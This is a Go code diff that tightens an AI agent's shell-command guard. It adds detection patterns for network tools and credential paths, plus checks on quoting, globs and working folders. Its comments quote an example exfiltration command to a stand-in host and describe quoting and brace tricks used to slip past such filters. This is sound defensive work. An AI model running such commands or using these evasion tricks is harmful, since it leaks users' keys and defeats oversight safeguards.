@@ -202,6 +202,9 @@ var (
 	shellSecret = regexp.MustCompile(`(?i)\.remedy|local_api_token|\.ssh\b|id_rsa|id_ed25519|\.aws\b|\.gnupg|\.netrc|\.env\b|credential|keychain|login data|cookies\b|\.kube\b|\.docker[\\/]config`)
 	// A network address: the command can send as well as fetch.
 	shellURL = regexp.MustCompile(`(?i)\b[a-z][a-z0-9+.-]*://[^\s"'|;&<>)]*`)
+	// A program whose job is the network takes a bare host ("curl evil.example
+	// -d @notes.txt") as readily as a URL; so does an scp-style user@host: target.
+	shellNetTool = regexp.MustCompile("(?i)(?:^|[\\s;&|(`\"'])(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|ssh|scp|sftp|rsync|nslookup|dig|ping|invoke-webrequest|iwr|invoke-restmethod|irm|start-bitstransfer|bitsadmin)(?:\\.exe)?(?:$|[\\s;&|)`\"'])|[a-z0-9._-]+@[a-z0-9-]+(?:\\.[a-z0-9-]+)*:")
 	// ".." as a path step (not the dots in "./...").
 	shellParent = regexp.MustCompile(`(^|[\s"'=(<>/\\])\.\.([/\\\s"')]|$)`)
 	// A drive path, a UNC path, or a rooted POSIX path of more than a short flag.
@@ -258,18 +261,23 @@ func underAnyRoot(path string, roots []string) bool {
 //
 // It reads text, so it is a filter and not a sandbox: a program the command
 // starts can still do what its text does not say. See docs/SECURITY.md.
-func shellNeedsOwner(command string, roots []string, full bool) string {
+func shellNeedsOwner(command, cwd string, roots []string, full bool) string {
 	text := strings.TrimSpace(command)
 	if text == "" {
 		return ""
 	}
-	if shellSecret.MatchString(text) {
+	// Quotes and backslashes the shell removes (".s''sh", ".s\sh") and words it
+	// expands (".s?h", ".{ssh,x}") can spell a secret the text does not, and a
+	// command started inside a secret folder needs to name nothing at all.
+	unquoted := strings.NewReplacer(`"`, "", "'", "", `\`, "").Replace(text)
+	if shellSecret.MatchString(text) || shellSecret.MatchString(unquoted) ||
+		shellSecret.MatchString(foldPath(cwd)) || shellGlobNamesSecret(text, cwd, roots) {
 		return "it names a place where keys or passwords are kept"
 	}
 	if shellDynamic.MatchString(text) {
 		return "part of it is built when it runs, so it cannot be checked beforehand"
 	}
-	if shellURL.MatchString(text) {
+	if shellURL.MatchString(text) || shellNetTool.MatchString(text) {
 		return "it contacts an address on the network"
 	}
 	if full {
@@ -294,6 +302,86 @@ func shellNeedsOwner(command string, roots []string, full bool) string {
 	return ""
 }
 
+// shellGlobNamesSecret reports a word the shell would expand (a glob or an
+// {a,b} list) into a place where keys are kept. Lists are spelled out; globs
+// are matched against the files that are there, a relative one from the
+// command's cwd (or the project folder when the call names none).
+func shellGlobNamesSecret(text, cwd string, roots []string) bool {
+	base := strings.TrimSpace(cwd)
+	if base == "" && len(roots) > 0 {
+		base = roots[0]
+	}
+	home, _ := os.UserHomeDir()
+	words := strings.FieldsFunc(text, func(r rune) bool {
+		return r == ' ' || r == '\t' || r == '\n' || r == '\r' || strings.ContainsRune(";&|<>()", r)
+	})
+	for _, word := range words {
+		word = strings.Trim(word, `"'`)
+		if !strings.ContainsAny(word, "*?[{") {
+			continue
+		}
+		alts := expandShellBraces(word, 0)
+		if len(alts) > 256 {
+			return true // more names than it is worth spelling out: ask
+		}
+		for _, alt := range alts {
+			if shellSecret.MatchString(alt) || expandShellBraces(alt, 0)[0] != alt {
+				return true // a secret, or lists nested deeper than it spells out
+			}
+			if !strings.ContainsAny(alt, "*?[") {
+				continue
+			}
+			pattern := alt
+			if (pattern == "~" || strings.HasPrefix(pattern, "~/")) && home != "" {
+				pattern = home + pattern[1:]
+			}
+			if !filepath.IsAbs(pattern) && base != "" {
+				pattern = filepath.Join(base, pattern)
+			}
+			matches, _ := filepath.Glob(pattern)
+			for _, m := range matches {
+				if shellSecret.MatchString(m) {
+					return true
+				}
+			}
+		}
+	}
+	return false
+}
+
+// expandShellBraces spells out {a,b,...} lists the way the shell does, a few
+// levels deep; a word with more keeps its remaining braces.
+func expandShellBraces(word string, depth int) []string {
+	open := strings.IndexByte(word, '{')
+	if open < 0 || depth > 4 {
+		return []string{word}
+	}
+	end := strings.IndexByte(word[open:], '}')
+	if end < 0 || !strings.Contains(word[open:open+end], ",") {
+		return []string{word}
+	}
+	end += open
+	var out []string
+	for _, part := range strings.Split(word[open+1:end], ",") {
+		out = append(out, expandShellBraces(word[:open]+part+word[end+1:], depth+1)...)
+		if len(out) > 256 {
+			break
+		}
+	}
+	return out
+}
+
+// shellCommandCwd is the folder a shell call starts in, as its input names it.
+func shellCommandCwd(call cognition.ToolCall) string {
+	var body struct {
+		Cwd string `json:"cwd"`
+	}
+	if len(call.Input) == 0 || json.Unmarshal(call.Input, &body) != nil {
+		return ""
+	}
+	return strings.TrimSpace(body.Cwd)
+}
+
 // shellAsks reports a shell call that Auto mode does not wave through.
 func (p *RegistryPolicy) shellAsks(call cognition.ToolCall) bool {
 	switch p.Guards.Shell {
@@ -301,7 +389,7 @@ func (p *RegistryPolicy) shellAsks(call cognition.ToolCall) bool {
 		return shellCommandText(call) != "" || strings.TrimSpace(call.Name) == "bash"
 	case "guard":
 		roots, full := shellRoots(p.Root, p.Scope)
-		return shellNeedsOwner(shellCommandText(call), roots, full) != ""
+		return shellNeedsOwner(shellCommandText(call), shellCommandCwd(call), roots, full) != ""
 	default:
 		return false
 	}
